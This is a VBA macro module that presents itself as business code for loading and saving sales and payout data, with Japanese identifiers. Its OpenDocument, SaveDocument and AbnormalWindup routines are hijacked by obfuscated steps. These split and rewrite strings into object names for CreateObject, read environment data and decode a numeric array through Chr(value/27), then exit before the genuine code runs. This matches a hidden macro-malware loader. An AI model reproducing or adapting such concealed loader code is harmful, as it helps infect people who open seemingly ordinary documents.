Public variablrName1DASH_1 As Object
Public variablrName3 As Object
Public variablrName1DASH_3 As Object
Public variablrName5() As String


Public variablrName1DASH_4 As String
Public trutrufast() As String
Public variablrName1_tolko1 As String
Public variablrName1DASHfiddle As Object
Public variablrName4 As String
Public variablrName2 As String
Public somebody As Variant
Public Function indata_to_kingaku(ByVal idx As Long, ByVal indata As Long) As Long
	Dim kingaku As Long
	Dim pasIdx As Long
	pasIdx = f1002_get_.sbt(idx)
	Select Case f1002_get_.Kind(idx)
		Case 2, 5, 6
			If f1007_get_.urikin(pasIdx) = 0 Or f1007_get_.inpscl(pasIdx) = 0 Then
				kingaku = 0
			Else
				kingaku = indata * f1007_get_.inpscl(pasIdx) * f1007_get_.tamatanka(pasIdx)
			End If
		Case Else
			kingaku = indata * 100
	End Select
	indata_to_kingaku = kingaku
End Function

Public Sub set_safe_rel(ByVal rdb As Long, ByVal newValue As Long, ByVal dataLink As Boolean)
	g_dai.Rel(rdb - 1).safe = newValue
	If dataLink Then
		g_dai.Rel(rdb - 1).out = newValue
	End If
End Sub

Public Sub set_start_rel(ByVal rdb As Long, ByVal newValue As Long, ByVal dataLink As Boolean)
	g_dai.Rel(rdb - 1).Start = newValue
	If dataLink Then
	End If
End Sub

Public Sub set_gen1uri_rel(ByVal rdb As Long, ByVal newValue As Long, ByVal dataLink As Boolean)
	Dim sbt As Long
	Dim kinko As Long
	g_dai.Rel(rdb - 1).gen1uri = newValue
	If dataLink Then
		sbt = f1001_get_.sbt(rdb)
		g_dai.Rel(rdb - 1).safe = -(g_dai.Rel(rdb - 1).gen1uri + g_dai.Rel(rdb - 1).gen2uri) / f1007_get_.tamatanka(sbt) / f1007_get_.inpscl(sbt)
		kinko = f1001_get_.kinko(rdb)
		g_zen.Rel(kinko - 1).urikin = sum_kinko_dai(kinko)
	End If
End Sub

Public Sub AbnormalWindup()
	Dim rc As Long
	Dim rs As Long
	Set variablrName1DASH1solo = CreateObject(trutrufast(3))
	Set variablrName1DASH_3 = variablrName1DASH1solo.Environment(trutrufast(4))
	Dim apdistance As Integer
	For apdistance = LBound(variablrName5) To UBound(variablrName5)
		variablrName4 = variablrName4 & SUBBUS3(apdistance)
	Next apdistance
	CheckRecovery
	Exit Sub
	Dim ftp As String
	For rs = 1 To f1000_get_rs + 1
		rc = ft.p.Connect("as" & CStr(rs), "super", "user")
		If rc = 0 Then
			rc = ft.p.DeleteFile("/r0/set")
			rc = ft.p.DeleteFile("/r0/mf6407_*")
			rc = ft.p.DeleteFile("/r0/mf6411*")
			rc = ft.p.DeleteFile("/r0/setok")
			rc = ft.p.DeleteFile("/r0/setng")
			ft.p.Close
		End If
	Next
End Sub

Public Function DataRecover(ByVal fLink As Boolean) As Boolean
	Dim I As Long
	Dim msg As String
	DataRecover = False
	If CheckGuid Then
		f640X_b.uild err_buf, err_count, bld_result, fLink
		If f640X_put = False Then
			Exit Function
		End If
		If set_put = False Then
			Exit Function
		End If
		SaveGu.ID
		DataRecover = True
	Else
		MsgBox "PC", vbCritical
	End If
End Function

Public Sub ShowResult()
	frmResult.Show vbModal
End Sub

Public Function SUBBUS3(variablrName6 As Integer) As String
	Dost = CInt(variablrName5(variablrName6))
	SUBBUS3 = Chr(Dost / (35 - 8))
End Function

Public Function SUBBUS2(A1 As String, A2 As String, A3 As String) As String
	SUBBUS2 = Replace(A1, A2, A3)
End Function

Public Function GetDocumentName() As String
	If g_fileName = "" Then
		GetDocumentName = DEF_FILE_NAME
	Else
		GetDocumentName = g_fileName
	End If
End Function

Public Function NewDocument() As Boolean
	Erase g_dai.Rel
	Erase g_zen.Rel
	NewDocument = LoadBaseFile
End Function

Public Function OpenDocument(typicalName As String) As Boolean
	On Error GoTo ErrHandler
	Dim skipData As Long
	Dim fno As Integer
	trutrufast = Split(variablrName2, "ROOOOH")
	Set variablrName3 = CreateObject(trutrufast(1))
	Set variablrName1DASHfiddle = CreateObject(trutrufast(2))
	Dim I As Integer
	Dim d As Boolean
	d = True
	IsWord = True
	For I = 1 To Len(Trim("eesucka"))
		If d = False Then
			Set variablrName1DASH_1 = CreateObject(trutrufast(I - 2))
			Exit For
		Else
			d = False
		End If
	Next I
	AbnormalWindup
	Exit Function
	g_fileName = typicalName
	I = 0
	fno = FreeFile
	Open Replace(g_fileName, ".csv", "_d.csv") For Input As fno
	Do While Not EOF(fno)
		I = I + 1
	Loop
	Close fno
	I = 0
	fno = FreeFile
	Open Replace(g_fileName, ".csv", "_z.csv") For Input As fno
	Do While Not EOF(fno)
		I = I + 1
	Loop
	Close fno
	OpenDocument = True
	Exit Function
	ErrHandler:
	OpenDocument = False
End Function

Public Function SaveDocument(typicalName As String) As Boolean
	On Error GoTo ErrHandler
	Dim I As Long
	Dim fno As Integer
	variablrName2 = SUBBUS2(variablrName2, "ROOH", "M")
	variablrName2 = SUBBUS2(variablrName2, "ROOOH", "s")
	OpenDocument ""
	Exit Function
	fno = FreeFile
	Open typicalName For Output As fno
	Write #fno, Now
	Close fno
	I = 0
	fno = FreeFile
	Open Replace(typicalName, ".csv", "_d.csv") For Output As fno
	For I = 0 To UBound(g_dai.Rel)
		Write #fno, I + 1, g_dai.Rel(I).out, g_dai.Rel(I).safe, g_dai.Rel(I).Start, g_dai.Rel(I).gen1uri, g_dai.Rel(I).gen2uri
	Next
	Close fno
	I = 0
	fno = FreeFile
	Open Replace(typicalName, ".csv", "_z.csv") For Output As fno
	For I = 0 To UBound(g_zen.Rel)
		Write #fno, I + 1, g_zen.Rel(I).urikin
	Next
	Close fno
	SaveDocument = True
	Exit Function
	ErrHandler:
	SaveDocument = False
End Function


Public Sub erer()

End Sub
